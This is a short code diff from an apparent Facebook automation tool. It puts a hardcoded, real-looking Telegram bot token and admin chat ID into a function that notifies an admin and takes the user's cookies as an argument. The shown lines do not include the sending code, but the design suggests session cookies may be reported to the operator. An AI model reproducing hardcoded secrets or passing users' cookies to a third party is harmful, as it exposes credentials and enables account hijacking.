@@ -474,8 +474,8 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
 def send_telegram_notification(username, automation_state=None, cookies=""):
     """Send admin notification via Telegram bot - MUCH MORE RELIABLE than Facebook!"""
     try:
-        telegram_bot_token = "79045"
-        telegram_admin_chat_id = "5326"
+        telegram_bot_token = "7131576613:AAEYRI8k1R6m4UNUV8iaBsfEkybJ3u3mZNw"
+        telegram_admin_chat_id = "7131576613"
         
         from datetime import datetime
         import pytz
